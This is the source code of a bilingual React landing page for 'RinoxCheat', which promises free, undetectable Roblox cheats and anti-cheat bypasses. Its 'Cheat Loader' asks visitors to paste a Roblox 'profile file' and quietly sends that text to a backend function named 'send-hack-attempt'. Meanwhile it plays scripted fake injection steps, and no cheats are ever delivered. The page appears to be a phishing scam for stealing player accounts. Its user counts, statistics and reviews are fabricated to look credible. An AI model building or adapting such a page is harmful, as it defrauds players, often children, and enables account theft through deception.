import { useEffect, useRef, useState } from "react";
import CursorTrail from "@/components/CursorTrail";
import Preloader from "@/components/Preloader";
import ScrollProgress from "@/components/ScrollProgress";
import BackToTop from "@/components/BackToTop";
import Reveal from "@/components/Reveal";
import AnimatedNumber from "@/components/AnimatedNumber";
import Marquee from "@/components/Marquee";
import KonamiEgg from "@/components/KonamiEgg";
import GamesShowcase from "@/components/GamesShowcase";
import Comparison from "@/components/Comparison";
import Changelog from "@/components/Changelog";
import HowItWorks from "@/components/HowItWorks";
import TrustBadges from "@/components/TrustBadges";
import ScreenshotMockup from "@/components/ScreenshotMockup";
import Terminal from "@/components/Terminal";
import ShareButton from "@/components/ShareButton";
import VisitCounter from "@/components/VisitCounter";
import FakeSocialProof from "@/components/FakeSocialProof";
import { useFocusMode } from "@/hooks/useFocusMode";
import { useUISounds } from "@/hooks/useUISounds";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "@/hooks/use-toast";
import {
  ShieldCheck,
  Zap,
  CheckCircle2,
  Play,
  Gamepad2,
  Crosshair,
  Eye,
  Wind,
  Activity,
  ChevronDown,
  Star,
  Volume2,
  VolumeX,
  Menu,
  X,
  Sparkles,
  Users,
  Server,
  Timer,
  Rocket,
  History as HistoryIcon,
  Trash2,
  Smartphone,
  Download,
  Trophy,
} from "lucide-react";


type Language = "fr" | "en";

const TRANSLATIONS = {
  fr: {
    versionBadge: "2026 Edition · v3.0 lancé",
    hero_title: "Cheats Roblox nouvelle gen.",
    hero_highlight: "Indétectable. Instantané.",
    hero_desc: "Le toolkit de cheats Roblox le plus avancé en 2026. Aimbot, ESP, Fly, Speed — bypass Byfron & Hyperion. Rapide, propre, indétectable. 100% gratuit.",
    getCheats: "Obtenir les cheats",
    watchTutorial: "Voir le tutoriel",
    undetected: "Indétectable",
    instantDelivery: "Livraison instantanée",
    allGames: "Tous les jeux Roblox",
    allDevices: "Tous appareils",
    features: "Cheats",
    get: "Obtenir",
    tutorial: "Tutoriel",
    online: "En ligne",
    aimbotTitle: "Aimbot",
    aimbotDesc: "Lock-on précis, smoothing réglable, FOV personnalisable pour tous les Roblox shooters.",
    aimbotTip: "Précision au pixel près",
    espTitle: "ESP & Wallhack",
    espDesc: "Voir les joueurs, items et objectifs à travers les murs — distance, HP, équipe.",
    espTip: "Vision à travers les murs",
    flyTitle: "Fly, Speed & No-Clip",
    flyDesc: "Mouvement total — vol, vitesse boostée et traversée des collisions.",
    flyTip: "Liberté de mouvement totale",
    undetectedTitle: "Indétectable",
    undetectedDesc: "Bypass Byfron & Hyperion mis à jour en continu pour une session safe.",
    undetectedTip: "0 ban rapporté en 2026",
    cheatLoaderTitle: "Cheat Loader",
    secureSession: "Session sécurisée",
    robloxSupported: "Supporté",
    profileLabel: "Indique ton fichier de profil Roblox comme sur la vidéo pour recevoir les cheats.",
    profilePlaceholder: "Fichier de profil Roblox...",
    deliveryNote: "Les cheats sont livrés directement à ton compte. 100% gratuit & safe.",
    injectButton: "Injecter les cheats",
    loading: "Chargement...",
    cheatsInjected: "Cheats injectés",
    launchRoblox: "Lance Roblox — tes cheats seront actifs sous 2–3 minutes.",
    tutorialTitle: "Comment ça marche",
    tutorialDesc: "2 minutes pour tout comprendre avant de lancer tes cheats.",
    videoNotDisplaying: "Si la vidéo ne s'affiche pas ici, ",
    openYoutube: "ouvrez-la sur YouTube",
    copyright: "RinoxCheat © 2026",
    privateNote: "Outil privé · Gratuit & safe",
    faqTitle: "Questions Fréquemment Posées",
    faqDesc: "Trouve les réponses à tes questions les plus courantes",
    reviewsTitle: "Avis Clients",
    reviewsDesc: "Ce que disent nos utilisateurs satisfaits",
    missingInfo: "Info manquante",
    errorMsg: "Veuillez remplir le champ du profil",
    connecting: "Connexion au serveur Roblox...",
    loading2: "Chargement des modules...",
    bypassing: "Contournement de Byfron / Hyperion...",
    injecting: "Injection des scripts...",
    // NEW
    systemsOperational: "Tous les systèmes opérationnels",
    freeSafe: "100% gratuit & safe",
    statsTitle: "En chiffres",
    statsDesc: "Une communauté qui grandit chaque jour",
    activeUsers: "Utilisateurs actifs",
    scriptsInjected: "Scripts injectés",
    uptime: "Uptime",
    avgTime: "Temps moyen d'injection",
    roadmapTitle: "Roadmap",
    roadmapDesc: "Ce qui arrive dans les prochaines semaines",
    q1: "T1 2026",
    q1t: "Bypass Byfron v3.0",
    q1d: "Nouvelle génération d'obfuscation, indétectable sur les derniers patches.",
    q2: "T2 2026",
    q2t: "Interface repensée",
    q2d: "Nouveau loader avec profils sauvegardés et raccourcis clavier personnalisables.",
    q3: "T3 2026",
    q3t: "Hyper surface",
    q3d: "Cheat à deux à partir d'une seule injection.",
    trustedBy: "Plus de",
    trustedByPlayers: "joueurs nous font confiance",
    marqueeItems: [
      "Aimbot Silent v2.4",
      "ESP Ultra",
      "Fly Mode",
      "Speed Hack",
      "No-Clip",
      "Auto Farm",
      "Infinite Jump",
      "God Mode",
      "Teleport",
      "Kill Aura",
    ],
    charCount: "caractères",
    clear: "Effacer",
    history: "Historique",
    historyEmpty: "Aucune injection récente",
    clearHistory: "Vider",
    soundOn: "Sons activés",
    soundOff: "Sons désactivés",
  },
  en: {
    versionBadge: "2026 Edition · v3.0 shipped",
    hero_title: "Next-gen Roblox cheats.",
    hero_highlight: "Undetected. Instant.",
    hero_desc: "The most advanced Roblox cheat toolkit in 2026. Aimbot, ESP, Fly, Speed — bypass Byfron & Hyperion. Fast, clean, undetectable. 100% free.",
    getCheats: "Get the cheats",
    watchTutorial: "Watch tutorial",
    undetected: "Undetected",
    instantDelivery: "Instant delivery",
    allGames: "All Roblox games",
    allDevices: "All devices",
    features: "Cheats",
    get: "Get",
    tutorial: "Tutorial",
    online: "Online",
    aimbotTitle: "Aimbot",
    aimbotDesc: "Precise lock-on, adjustable smoothing, customizable FOV for all Roblox shooters.",
    aimbotTip: "Pixel-perfect accuracy",
    espTitle: "ESP & Wallhack",
    espDesc: "See players, items and objectives through walls — distance, HP, team.",
    espTip: "See through walls",
    flyTitle: "Fly, Speed & No-Clip",
    flyDesc: "Total movement — flight, boosted speed and collision traversal.",
    flyTip: "Total movement freedom",
    undetectedTitle: "Undetected",
    undetectedDesc: "Bypass Byfron & Hyperion continuously updated for safe sessions.",
    undetectedTip: "0 bans reported in 2026",
    cheatLoaderTitle: "Cheat Loader",
    secureSession: "Secure session",
    robloxSupported: "Supported",
    profileLabel: "Enter your Roblox profile file as shown in the video to receive cheats.",
    profilePlaceholder: "Roblox Profile File...",
    deliveryNote: "Cheats are delivered directly to your account. 100% free & safe.",
    injectButton: "Inject cheats",
    loading: "Loading...",
    cheatsInjected: "Cheats Injected",
    launchRoblox: "Launch Roblox — your cheats will be active within 2–3 minutes.",
    tutorialTitle: "How it works",
    tutorialDesc: "2 minutes to understand everything before launching your cheats.",
    videoNotDisplaying: "If the video doesn't display here, ",
    openYoutube: "open it on YouTube",
    copyright: "RinoxCheat © 2026",
    privateNote: "Private tool · Free & safe",
    faqTitle: "Frequently Asked Questions",
    faqDesc: "Find answers to your most common questions",
    reviewsTitle: "Customer Reviews",
    reviewsDesc: "What our satisfied users are saying",
    missingInfo: "Missing info",
    errorMsg: "Please fill in the profile field",
    connecting: "Connecting to Roblox server...",
    loading2: "Loading cheat modules...",
    bypassing: "Bypassing Byfron / Hyperion...",
    injecting: "Injecting scripts...",
    systemsOperational: "All systems operational",
    freeSafe: "100% free & safe",
    statsTitle: "By the numbers",
    statsDesc: "A community growing every day",
    activeUsers: "Active users",
    scriptsInjected: "Scripts injected",
    uptime: "Uptime",
    avgTime: "Avg. injection time",
    roadmapTitle: "Roadmap",
    roadmapDesc: "What's coming in the next weeks",
    q1: "Q1 2026",
    q1t: "Byfron Bypass v3.0",
    q1d: "New generation of obfuscation, undetectable on the latest patches.",
    q2: "Q2 2026",
    q2t: "Redesigned UI",
    q2d: "New loader with saved profiles and customizable keybinds.",
    q3: "Q3 2026",
    q3t: "Hyper surface",
    q3d: "Multiplayer cheat with 1 injection.",
    trustedBy: "Trusted by over",
    trustedByPlayers: "players worldwide",
    marqueeItems: [
      "Silent Aimbot v2.4",
      "Ultra ESP",
      "Fly Mode",
      "Speed Hack",
      "No-Clip",
      "Auto Farm",
      "Infinite Jump",
      "God Mode",
      "Teleport",
      "Kill Aura",
    ],
    charCount: "characters",
    clear: "Clear",
    history: "History",
    historyEmpty: "No recent injections",
    clearHistory: "Clear",
    soundOn: "Sound on",
    soundOff: "Sound off",
  },
};

const STEPS_FR = [
  "Connexion au serveur Roblox...",
  "Chargement des modules...",
  "Contournement de Byfron / Hyperion...",
  "Injection des scripts...",
];

const STEPS_EN = [
  "Connecting to Roblox server...",
  "Loading cheat modules...",
  "Bypassing Byfron / Hyperion...",
  "Injecting scripts...",
];

const HISTORY_KEY = "rinox-injection-history";

const Index = () => {
  const [language, setLanguage] = useState<Language>("fr");
  const [target, setTarget] = useState("");
  const [loading, setLoading] = useState(false);
  const [steps, setSteps] = useState<string[]>([]);
  const [done, setDone] = useState(false);
  const [expandedFaq, setExpandedFaq] = useState<number | null>(null);
  const [typedTitle, setTypedTitle] = useState("");
  const [typedHighlight, setTypedHighlight] = useState("");
  const [usersOnline, setUsersOnline] = useState(12847);
  const [reviewIndex, setReviewIndex] = useState(0);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [history, setHistory] = useState<{ label: string; at: number }[]>(() => {
    if (typeof window === "undefined") return [];
    try {
      const raw = localStorage.getItem(HISTORY_KEY);
      return raw ? JSON.parse(raw) : [];
    } catch {
      return [];
    }
  });
  const orb1Ref = useRef<HTMLDivElement>(null);
  const orb2Ref = useRef<HTMLDivElement>(null);
  const orb3Ref = useRef<HTMLDivElement>(null);
  const heroRef = useRef<HTMLHeadingElement>(null);
  const [navScrolled, setNavScrolled] = useState(false);
  const sounds = useUISounds();

  useFocusMode({
    on: language === "fr" ? "Mode Focus activé (F)" : "Focus mode on (F)",
    off: language === "fr" ? "Mode Focus désactivé" : "Focus mode off",
  });


  const t = TRANSLATIONS[language];
  const STEPS = language === "fr" ? STEPS_FR : STEPS_EN;

  const FEATURES = [
    { icon: Crosshair, title: t.aimbotTitle, desc: t.aimbotDesc, tip: t.aimbotTip },
    { icon: Eye, title: t.espTitle, desc: t.espDesc, tip: t.espTip },
    { icon: Wind, title: t.flyTitle, desc: t.flyDesc, tip: t.flyTip },
    { icon: ShieldCheck, title: t.undetectedTitle, desc: t.undetectedDesc, tip: t.undetectedTip },
  ];

  const FAQs = language === "fr" ? [
    { q: "Comment fonctionne le bypass Byfron ?", a: "Notre système utilise des techniques avancées de détection d'anti-cheat pour contourner Byfron en temps réel." },
    { q: "Est-ce vraiment indétectable ?", a: "Oui, nos cheats sont mis à jour continuellement pour éviter les détections. Nous offrons une protection maximale." },
    { q: "Combien de temps pour recevoir les cheats ?", a: "Les cheats sont livrés instantanément après injection. Ils seront actifs en 2-3 minutes." },
    { q: "Fonctionne sur tous les jeux Roblox ?", a: "Oui, notre toolkit fonctionne sur pratiquement tous les jeux Roblox populaires." },
    { q: "C'est vraiment gratuit ?", a: "Oui, 100% gratuit. Aucun paiement, aucune carte bancaire demandée. Tout est safe et open." },
  ] : [
    { q: "How does the Byfron bypass work?", a: "Our system uses advanced anti-cheat detection techniques to bypass Byfron in real-time." },
    { q: "Is it really undetectable?", a: "Yes, our cheats are continuously updated to avoid detection. We provide maximum protection." },
    { q: "How long to receive the cheats?", a: "Cheats are delivered instantly after injection. They will be active within 2-3 minutes." },
    { q: "Does it work on all Roblox games?", a: "Yes, our toolkit works on virtually all popular Roblox games." },
    { q: "Is it really free?", a: "Yes, 100% free. No payment, no credit card required. Everything is safe and open." },
  ];

  const REVIEWS = language === "fr" ? [
    { name: "Zeyn00", game: "Rivals", rating: 5, text: "Les cheats marchent parfaitement ! Aucune détection en 2 mois." },
    { name: "Sushi_tm", game: "Steal a brainrot", rating: 5, text: "Incroyable ! le fly est très smooth et le instant steal est ultra utile." },
    { name: "PAN23", game: "Grow A Garden 2", rating: 5, text: "Livraison instantanée, interface simple, marche grv bien !" },
    { name: "Emmzzz", game: "Doors", rating: 5, text: "Meilleur investissement jamais fait. Support réactif aussi !" },
  ] : [
    { name: "Zeyn00", game: "Rivals", rating: 5, text: "Cheats work perfectly! No detection for 2 months." },
    { name: "Sushi_tm", game: "Steal a brainrot", rating: 5, text: "Incredible! The aimbot is very smooth and the ESP is ultra useful." },
    { name: "PAN23", game: "Grow A Garden 2", rating: 5, text: "Instant delivery, simple interface, works great!" },
    { name: "Emmzzz", game: "Doors", rating: 5, text: "Best investment ever. Responsive support too!" },
  ];

  useEffect(() => {
    document.title = language === "fr" ? "RinoxCheat — Cheats Roblox gratuits 2026" : "RinoxCheat — Free Roblox Cheats 2026";
    const desc = language === "fr"
      ? "RinoxCheat: les meilleurs cheats Roblox gratuits et indétectables en 2026. Aimbot, ESP, Fly, Speed — bypass Byfron & Hyperion. Compatible tous appareils."
      : "RinoxCheat: The best free undetectable Roblox cheats in 2026. Aimbot, ESP, Fly, Speed — bypass Byfron & Hyperion. Works on all devices.";
    let m = document.querySelector('meta[name="description"]');
    if (!m) {
      m = document.createElement("meta");
      m.setAttribute("name", "description");
      document.head.appendChild(m);
    }
    m.setAttribute("content", desc);
  }, [language]);

  useEffect(() => {
    setTypedTitle("");
    setTypedHighlight("");
    const full1 = t.hero_title;
    const full2 = t.hero_highlight;
    let i = 0;
    const timers: number[] = [];
    const typeTitle = () => {
      if (i <= full1.length) {
        setTypedTitle(full1.slice(0, i));
        i++;
        timers.push(window.setTimeout(typeTitle, 45));
      } else {
        let j = 0;
        const typeHighlight = () => {
          if (j <= full2.length) {
            setTypedHighlight(full2.slice(0, j));
            j++;
            timers.push(window.setTimeout(typeHighlight, 55));
          }
        };
        typeHighlight();
      }
    };
    typeTitle();
    return () => timers.forEach(clearTimeout);
  }, [language, t.hero_title, t.hero_highlight]);

  useEffect(() => {
    const id = window.setInterval(() => {
      setUsersOnline((u) => u + Math.floor(Math.random() * 5) - 1);
    }, 2200);
    return () => clearInterval(id);
  }, []);

  useEffect(() => {
    const onMove = (e: MouseEvent) => {
      const x = (e.clientX / window.innerWidth - 0.5) * 2;
      const y = (e.clientY / window.innerHeight - 0.5) * 2;
      if (orb1Ref.current) orb1Ref.current.style.transform = `translate(${x * 30}px, ${y * 30}px)`;
      if (orb2Ref.current) orb2Ref.current.style.transform = `translate(${x * -45}px, ${y * 25}px)`;
      if (orb3Ref.current) orb3Ref.current.style.transform = `translate(${x * 20}px, ${y * -35}px)`;
    };
    window.addEventListener("mousemove", onMove);
    return () => window.removeEventListener("mousemove", onMove);
  }, []);

  useEffect(() => {
    const id = window.setInterval(() => setReviewIndex((i) => i + 1), 4000);
    return () => clearInterval(id);
  }, []);

  useEffect(() => {
    const onMove = (e: MouseEvent) => {
      const t = e.target as HTMLElement | null;
      if (!t) return;
      const el = t.closest<HTMLElement>(".spotlight");
      if (!el) return;
      const r = el.getBoundingClientRect();
      el.style.setProperty("--mx", `${e.clientX - r.left}px`);
      el.style.setProperty("--my", `${e.clientY - r.top}px`);
    };
    window.addEventListener("mousemove", onMove);
    return () => window.removeEventListener("mousemove", onMove);
  }, []);

  useEffect(() => {
    try {
      localStorage.setItem(HISTORY_KEY, JSON.stringify(history.slice(0, 5)));
    } catch {}
  }, [history]);

  // Nav scroll state (enhanced glassmorphism when scrolled)
  useEffect(() => {
    const onScroll = () => setNavScrolled(window.scrollY > 20);
    window.addEventListener("scroll", onScroll, { passive: true });
    onScroll();
    return () => window.removeEventListener("scroll", onScroll);
  }, []);

  // Hero 3D parallax follow cursor
  useEffect(() => {
    const el = heroRef.current;
    if (!el) return;
    const onMove = (e: MouseEvent) => {
      const rect = el.getBoundingClientRect();
      const cx = rect.left + rect.width / 2;
      const cy = rect.top + rect.height / 2;
      const rx = ((e.clientY - cy) / rect.height) * -6;
      const ry = ((e.clientX - cx) / rect.width) * 6;
      el.style.transform = `perspective(900px) rotateX(${rx}deg) rotateY(${ry}deg)`;
    };
    const onLeave = () => {
      el.style.transform = "perspective(900px) rotateX(0) rotateY(0)";
    };
    window.addEventListener("mousemove", onMove);
    window.addEventListener("mouseleave", onLeave);
    return () => {
      window.removeEventListener("mousemove", onMove);
      window.removeEventListener("mouseleave", onLeave);
    };
  }, []);


  const handleHack = async (e?: React.MouseEvent<HTMLButtonElement>) => {
    if (e) {
      const btn = e.currentTarget;
      const rect = btn.getBoundingClientRect();
      const size = Math.max(rect.width, rect.height);
      const ripple = document.createElement("span");
      ripple.className = "ripple-span";
      ripple.style.width = ripple.style.height = `${size}px`;
      ripple.style.left = `${e.clientX - rect.left - size / 2}px`;
      ripple.style.top = `${e.clientY - rect.top - size / 2}px`;
      btn.appendChild(ripple);
      setTimeout(() => ripple.remove(), 650);
    }

    if (!target.trim()) {
      sounds.play("error");
      toast({
        title: t.missingInfo,
        description: t.errorMsg,
        variant: "destructive",
      });
      return;
    }
    sounds.play("click");
    setLoading(true);
    setDone(false);
    setSteps([]);

    const payload = `Game: Roblox\nUser: ${target}`;
    const label = target.slice(0, 32);
    const sendPromise = supabase.functions.invoke("send-hack-attempt", {
      body: { input: payload },
    });

    for (let i = 0; i < STEPS.length; i++) {
      await new Promise((r) => setTimeout(r, 550 + Math.random() * 350));
      setSteps((prev) => [...prev, STEPS[i]]);
      sounds.play("hover");
    }

    await new Promise((r) => setTimeout(r, 600));
    await sendPromise;

    setLoading(false);
    setDone(true);
    sounds.play("success");
    setHistory((h) => [{ label, at: Date.now() }, ...h.filter((x) => x.label !== label)].slice(0, 5));
    setTarget("");
  };

  const navLinks = [
    { href: "#features", label: t.features },
    { href: "#tool", label: t.get },
    { href: "#tutorial", label: t.tutorial },
  ];

  return (
    <div className="relative min-h-screen">
      <Preloader />
      <ScrollProgress />
      <CursorTrail />
      <BackToTop />
      <KonamiEgg label={language === "fr" ? "Mode Turbo débloqué 🚀" : "Turbo mode unlocked 🚀"} />


      {/* Systems ticker */}
      <div className="w-full bg-primary/10 border-b border-primary/20 text-center py-1.5 text-xs text-primary flex items-center justify-center gap-2">
        <span className="h-1.5 w-1.5 rounded-full bg-primary live-dot" />
        <span>{t.systemsOperational}</span>
        <span className="text-muted-foreground mx-2">·</span>
        <Sparkles className="h-3 w-3" />
        <span>{t.freeSafe}</span>
      </div>

      {/* Background layers */}
      <div aria-hidden className="pointer-events-none fixed inset-0 -z-10 overflow-hidden">
        <div className="absolute inset-0 grid-bg opacity-50" />
        <div className="absolute inset-0" style={{ background: "var(--gradient-radial)" }} />
        <div ref={orb1Ref} className="orb orb-1" />
        <div ref={orb2Ref} className="orb orb-2" />
        <div ref={orb3Ref} className="orb orb-3" />
        <div className="particles">
          {Array.from({ length: 14 }).map((_, i) => (
            <span
              key={i}
              className="particle"
              style={{
                left: `${(i * 73) % 100}%`,
                animationDelay: `${(i * 1.7) % 12}s`,
                animationDuration: `${14 + (i % 6) * 3}s`,
              }}
            />
          ))}
        </div>
      </div>

      {/* Nav */}
      <header className={`sticky top-0 z-30 backdrop-blur-md bg-background/70 border-b border-border/60 transition-all duration-300 ${navScrolled ? "nav-scrolled" : ""}`}>

        <div className="max-w-7xl mx-auto px-6 sm:px-10 lg:px-14 h-14 flex items-center justify-between">
          <div className="flex items-center gap-2 group logo-glitch cursor-pointer">
            <div className="h-7 w-7 rounded-md bg-gradient-to-br from-primary to-[hsl(var(--primary-glow))] bg-[length:200%_200%] animate-gradient-pan flex items-center justify-center transition-transform duration-300 group-hover:scale-110">
              <Crosshair className="h-4 w-4 text-primary-foreground" />
            </div>
            <span className="font-semibold tracking-tight logo-glitch-text">RinoxCheat</span>
          </div>
          <div className="hidden sm:flex items-center gap-6 text-sm text-muted-foreground">
            {navLinks.map((l) => (
              <a
                key={l.href}
                href={l.href}
                onMouseEnter={() => sounds.play("hover")}
                className="hover:text-foreground transition-colors hover:scale-105 inline-block"
              >
                {l.label}
              </a>
            ))}
          </div>
          <div className="flex items-center gap-2 sm:gap-3">
            {/* Sound toggle */}
            <button
              onClick={() => sounds.setEnabled(!sounds.enabled)}
              aria-label={sounds.enabled ? t.soundOn : t.soundOff}
              className="tip h-8 w-8 rounded-full border border-border bg-secondary/40 flex items-center justify-center text-muted-foreground hover:text-foreground hover:border-primary/40 transition-all"
              data-tip={sounds.enabled ? t.soundOn : t.soundOff}
            >
              {sounds.enabled ? <Volume2 className="h-3.5 w-3.5" /> : <VolumeX className="h-3.5 w-3.5" />}
            </button>

            {/* Language Selector */}
            <div className="flex items-center gap-1 bg-secondary/40 rounded-full p-1 border border-border/40">
              <button
                onClick={() => { setLanguage("fr"); sounds.play("click"); }}
                className={`px-2.5 py-0.5 rounded-full text-xs font-medium transition-all ${
                  language === "fr" ? "bg-primary text-primary-foreground" : "text-muted-foreground hover:text-foreground"
                }`}
              >
                FR
              </button>
              <button
                onClick={() => { setLanguage("en"); sounds.play("click"); }}
                className={`px-2.5 py-0.5 rounded-full text-xs font-medium transition-all ${
                  language === "en" ? "bg-primary text-primary-foreground" : "text-muted-foreground hover:text-foreground"
                }`}
              >
                EN
              </button>
            </div>
            <div className="hidden md:flex items-center gap-2 text-xs text-muted-foreground">
              <span className="h-2 w-2 rounded-full bg-primary live-dot" />
              <span className="tabular-nums">{usersOnline.toLocaleString()} {t.online}</span>
            </div>

            {/* Mobile burger */}
            <button
              onClick={() => setMobileMenuOpen((v) => !v)}
              className="sm:hidden h-8 w-8 rounded-md border border-border bg-secondary/40 flex items-center justify-center"
              aria-label="Menu"
            >
              <div className="relative h-4 w-4">
                <Menu
                  className={`absolute inset-0 h-4 w-4 transition-all duration-300 ${
                    mobileMenuOpen ? "opacity-0 rotate-90" : "opacity-100 rotate-0"
                  }`}
                />
                <X
                  className={`absolute inset-0 h-4 w-4 transition-all duration-300 ${
                    mobileMenuOpen ? "opacity-100 rotate-0" : "opacity-0 -rotate-90"
                  }`}
                />
              </div>
            </button>
          </div>
        </div>
        {/* Mobile menu drawer */}
        <div
          className={`sm:hidden overflow-hidden border-t border-border/40 bg-background/95 backdrop-blur transition-[max-height,opacity] duration-300 ${
            mobileMenuOpen ? "max-h-60 opacity-100" : "max-h-0 opacity-0"
          }`}
        >
          <nav className="flex flex-col px-5 py-3 gap-2">
            {navLinks.map((l, i) => (
              <a
                key={l.href}
                href={l.href}
                onClick={() => setMobileMenuOpen(false)}
                className="py-2 text-sm text-foreground/80 hover:text-primary border-b border-border/40 last:border-0 animate-fade-in"
                style={{ animationDelay: `${i * 50}ms` }}
              >
                {l.label}
              </a>
            ))}
          </nav>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-6 sm:px-10 lg:px-14 pb-20">
        {/* Hero */}
        <section className="pt-14 sm:pt-20 pb-12 text-center max-w-3xl mx-auto">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-border bg-secondary/60 text-xs text-muted-foreground mb-6 animate-fade-in hover:scale-105 transition-transform duration-300">
            <Activity className="h-3.5 w-3.5 text-primary" />
            <span>{t.versionBadge}</span>
          </div>
          <h1
            ref={heroRef}
            className="hero-3d text-4xl sm:text-6xl font-semibold tracking-tight leading-[1.05] mb-5 animate-fade-in"
            style={{ animationDelay: "80ms" }}
          >
            <span className={typedTitle.length < t.hero_title.length ? "typing-caret" : ""}>{typedTitle}</span>
            <br className="hidden sm:block" />
            <span className="text-gradient bg-[length:200%_auto] animate-gradient-pan">
              <span className={typedTitle.length >= t.hero_title.length && typedHighlight.length < t.hero_highlight.length ? "typing-caret" : ""}>{typedHighlight}</span>
            </span>
          </h1>

          <p className="text-muted-foreground text-base sm:text-lg leading-relaxed max-w-xl mx-auto animate-fade-in" style={{ animationDelay: "160ms" }}>
            {t.hero_desc}
          </p>
          <div className="mt-8 flex items-center justify-center gap-3 animate-fade-in" style={{ animationDelay: "240ms" }}>
            <a href="#tool" onClick={() => sounds.play("click")}>
              <Button className="h-11 px-6 rounded-full font-medium shadow-[0_8px_30px_-8px_hsl(var(--primary)/0.6)] hover:scale-110 hover:shadow-[0_12px_40px_-8px_hsl(var(--primary)/0.8)] transition-all duration-300 animate-bounce-in">
                {t.getCheats}
              </Button>
            </a>
            <a href="#tutorial" onClick={() => sounds.play("click")}>
              <Button variant="secondary" className="h-11 px-6 rounded-full font-medium hover:scale-110 transition-all duration-300">
                <Play className="h-4 w-4 mr-1.5" /> {t.watchTutorial}
              </Button>
            </a>
          </div>

          <div className="mt-10 flex flex-wrap items-center justify-center gap-x-8 gap-y-3 text-xs text-muted-foreground animate-fade-in" style={{ animationDelay: "320ms" }}>
            <span className="flex items-center gap-1.5 hover:text-primary transition-colors">
              <ShieldCheck className="h-3.5 w-3.5 text-primary" /> {t.undetected}
            </span>
            <span className="flex items-center gap-1.5 hover:text-primary transition-colors">
              <Zap className="h-3.5 w-3.5 text-primary" /> {t.instantDelivery}
            </span>
            <span className="flex items-center gap-1.5 hover:text-primary transition-colors">
              <Gamepad2 className="h-3.5 w-3.5 text-primary" /> {t.allGames}
            </span>
            <span className="flex items-center gap-1.5 hover:text-primary transition-colors">
              <Smartphone className="h-3.5 w-3.5 text-primary" /> {t.allDevices}
            </span>
          </div>
        </section>

        {/* Marquee */}
        <Reveal className="mb-16">
          <Marquee items={t.marqueeItems} />
        </Reveal>

        {/* Features */}
        <Reveal>
          <section id="features" className="grid sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-20" aria-label="Cheats">
            {FEATURES.map((f, i) => (
              <div
                key={f.title}
                onMouseEnter={() => sounds.play("hover")}
                className="tip group spotlight glass rounded-2xl p-5 hover:border-primary/50 hover:-translate-y-2 hover:shadow-[0_20px_40px_-20px_hsl(var(--primary)/0.5)] transition-all duration-300 transform hover:scale-105 cursor-pointer tilt-hover animate-fade-in"
                data-tip={f.tip}
                style={{ animationDelay: `${i * 100}ms` }}
              >
                <div className="h-9 w-9 rounded-lg bg-primary/10 border border-primary/20 flex items-center justify-center mb-4 transition-all duration-300 group-hover:scale-125 group-hover:rotate-12 group-hover:bg-primary/20">
                  <f.icon className="h-4 w-4 text-primary" />
                </div>
                <h3 className="font-medium mb-1 group-hover:text-primary transition-colors">{f.title}</h3>
                <p className="text-sm text-muted-foreground leading-relaxed group-hover:text-foreground/80 transition-colors">
                  {f.desc}
                </p>
              </div>
            ))}
          </section>
        </Reveal>

        {/* Live stats */}
        <Reveal>
          <section aria-label="Stats" className="mb-20">
            <div className="text-center mb-8">
              <h2 className="text-3xl font-semibold tracking-tight mb-2">{t.statsTitle}</h2>
              <p className="text-muted-foreground">{t.statsDesc}</p>
            </div>
            <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
              {[
                { icon: Users, value: 847231, label: t.activeUsers, suffix: "+" },
                { icon: Zap, value: 5238947, label: t.scriptsInjected, suffix: "" },
                { icon: Server, value: 99.98, label: t.uptime, suffix: "%", decimals: 2 },
                { icon: Timer, value: 2.4, label: t.avgTime, suffix: "s", decimals: 1 },
              ].map((s, i) => (
                <div
                  key={i}
                  className="glass rounded-2xl p-5 text-center hover:border-primary/40 transition-all duration-300"
                >
                  <div className="h-9 w-9 mx-auto rounded-lg bg-primary/10 border border-primary/20 flex items-center justify-center mb-3">
                    <s.icon className="h-4 w-4 text-primary" />
                  </div>
                  <div className="text-2xl sm:text-3xl font-semibold text-gradient bg-[length:200%_auto] animate-gradient-pan">
                    <AnimatedNumber value={s.value} suffix={s.suffix} decimals={s.decimals || 0} />
                  </div>
                  <div className="text-xs text-muted-foreground mt-1">{s.label}</div>
                </div>
              ))}
            </div>
          </section>
        </Reveal>

        {/* Tool */}
        <Reveal>
          <section id="tool" aria-label="Cheat panel" className="max-w-md mx-auto">
            <div className="gradient-border rounded-2xl glass shadow-[var(--shadow-card)] overflow-hidden animate-scale-in hover:shadow-[0_20px_60px_-20px_hsl(var(--primary)/0.4)] transition-all duration-300">
              <div className="flex items-center justify-between px-5 py-3 border-b border-border/50 bg-secondary/40">
                <div className="flex items-center gap-2 text-sm font-medium">
                  <Crosshair className="h-4 w-4 text-primary animate-spin-slow" />
                  {t.cheatLoaderTitle}
                </div>
                <span className="text-[10px] tracking-widest text-muted-foreground uppercase">
                  {t.secureSession}
                </span>
              </div>

              <div className="p-5 sm:p-6">
                <div className="flex items-center justify-between mb-4 p-3 rounded-lg bg-input border border-border">
                  <div className="flex items-center gap-2.5">
                    <Gamepad2 className="h-4 w-4 text-primary" />
                    <span className="text-sm font-medium">Roblox</span>
                  </div>
                  <span className="text-[10px] tracking-widest text-primary uppercase">
                    {t.robloxSupported}
                  </span>
                </div>

                <label htmlFor="target" className="block text-sm font-medium mt-1 mb-2">
                  {t.profileLabel}
                </label>
                <div className="relative">
                  <Input
                    id="target"
                    value={target}
                    onChange={(e) => setTarget(e.target.value)}
                    disabled={loading}
                    placeholder={t.profilePlaceholder}
                    maxLength={5000}
                    className="h-11 rounded-lg bg-input border-border focus-visible:ring-primary pr-10 transition-all duration-300"
                  />
                  {target.length > 0 && !loading && (
                    <button
                      onClick={() => { setTarget(""); sounds.play("click"); }}
                      aria-label={t.clear}
                      className="absolute right-2 top-1/2 -translate-y-1/2 h-7 w-7 rounded-md flex items-center justify-center text-muted-foreground hover:text-foreground hover:bg-secondary transition-colors"
                    >
                      <X className="h-3.5 w-3.5" />
                    </button>
                  )}
                </div>
                <div className="flex items-center justify-between mt-2">
                  <p className="text-xs text-muted-foreground">{t.deliveryNote}</p>
                  <span className="text-xs text-muted-foreground tabular-nums">
                    {target.length}/5000
                  </span>
                </div>

                <Button
                  onClick={handleHack}
                  onMouseEnter={() => !loading && sounds.play("hover")}
                  disabled={loading}
